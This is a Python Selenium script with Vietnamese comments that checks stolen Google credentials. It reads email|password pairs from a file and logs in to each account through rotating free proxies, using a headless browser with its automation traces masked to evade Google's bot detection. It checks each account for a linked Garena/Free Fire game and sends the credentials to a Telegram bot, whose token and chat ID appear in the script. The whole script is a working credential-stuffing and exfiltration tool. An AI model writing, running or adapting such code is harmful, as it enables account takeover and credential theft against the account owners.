import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CẤU HÌNH THÔNG TIN CỦA BẠN ---
TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
TELE_CHAT_ID = "6706357035"
FILE_INPUT = "acc.txt"

def send_tele(message):
    """Gửi thông báo về Telegram"""
    url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
    payload = {"chat_id": TELE_CHAT_ID, "text": message}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def get_proxies():
    """Lấy danh sách Proxy miễn phí mới nhất"""
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        res = requests.get(url, timeout=10)
        proxies = res.text.strip().split('\r\n')
        return [p for p in proxies if ":" in p]
    except:
        return []

def setup_driver(proxy):
    """Cấu hình trình duyệt Chrome ẩn danh cho Railway"""
    options = Options()
    options.add_argument(f'--proxy-server={proxy}')
    options.add_argument('--headless')  # Chạy không giao diện (bắt buộc)
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    # Đường dẫn Chromium trên Docker Railway
    options.binary_location = "/usr/bin/chromium"
    
    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)
    
    # Xóa dấu vết Selenium để tránh Google quét Bot
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    return driver

def check_acc(email, password, proxies):
    """Quy trình: Login -> Vào trang Connections -> Check chữ Garena/Free Fire"""
    # Chọn ngẫu nhiên 10 Proxy để thử cho acc này
    retry_proxies = random.sample(proxies, min(len(proxies), 10))
    
    for i, proxy in enumerate(retry_proxies):
        print(f"[*] [{email}] Đang thử với Proxy {i+1}/10: {proxy}")
        driver = None
        try:
            driver = setup_driver(proxy)
            wait = WebDriverWait(driver, 25) # Đợi tối đa 25s cho mạng yếu
            
            # 1. Truy cập trang đăng nhập Google
            driver.get("https://accounts.google.com/signin")
            
            # Điền Email
            email_box = wait.until(EC.presence_of_element_located((By.NAME, "identifier")))
            email_box.send_keys(email)
            driver.find_element(By.ID, "identifierNext").click()
            time.sleep(3)
            
            # Điền Password
            pass_box = wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
            pass_box.send_keys(password)
            driver.find_element(By.ID, "passwordNext").click()
            
            # Đợi load sau khi nhấn Login (Google thường load lâu ở bước này)
            time.sleep(10)
            
            # Kiểm tra xem có bị vướng Captcha hoặc Checkpoint không
            current_url = driver.current_url
            if "signin" in current_url or "challenge" in current_url:
                print(f"[-] Proxy {proxy} bị Google chặn. Đổi proxy...")
                driver.quit()
                continue
            
            # 2. Nếu đã Login thành công -> Vào thẳng trang check liên kết
            print(f"[+] Login thành công {email}! Đang kiểm tra Free Fire...")
            driver.get("https://myaccount.google.com/connections")
            time.sleep(6) # Đợi trang list game load xong
            
            html_content = driver.page_source.lower()
            
            # 3. Quét từ khóa Garena hoặc Free Fire
            if "garena" in html_content or "free fire" in html_content:
                result_msg = f"✅ LIVE FF: {email}|{password}"
            else:
                result_msg = f"❌ NO FF: {email}|{password}"
            
            print(result_msg)
            send_tele(result_msg) # Bắn kết quả về Telegram của bạn
            driver.quit()
            return True # Kết thúc acc này, chuyển sang acc tiếp theo
            
        except Exception as e:
            if driver:
                driver.quit()
            print(f"[!] Lỗi kết nối với Proxy {i+1}. Đang thử tiếp...")
            continue
            
    # Nếu qua 10 Proxy vẫn không được
    print(f"⚠️ THẤT BẠI: {email} (Sai pass hoặc dính xác minh danh tính)")
    return False

def main():
    send_tele("🚀 HỆ THỐNG ĐÃ SẴN SÀNG - BẮT ĐẦU CHECK 500 ACC!")
    
    if not os.path.exists(FILE_INPUT):
        send_tele("❌ Lỗi: Không tìm thấy file acc.txt!")
        return

    # Lấy danh sách Proxy tổng
    all_proxies = get_proxies()
    if not all_proxies:
        send_tele("❌ Lỗi: Không lấy được Proxy từ nguồn miễn phí!")
        return

    # Đọc danh sách acc
    with open(FILE_INPUT, "r") as f:
        accounts = [line.strip() for line in f if "|" in line]

    print(f"Tìm thấy {len(accounts)} tài khoản. Bắt đầu chạy...")

    for acc in accounts:
        email, password = acc.split("|")
        check_acc(email, password, all_proxies)
        
        # Nghỉ ngơi giữa các acc để tránh Google quét IP của Railway
        rest_time = random.randint(15, 30)
        print(f"Nghỉ {rest_time}s trước acc tiếp theo...")
        time.sleep(rest_time)

if __name__ == "__main__":
    main()
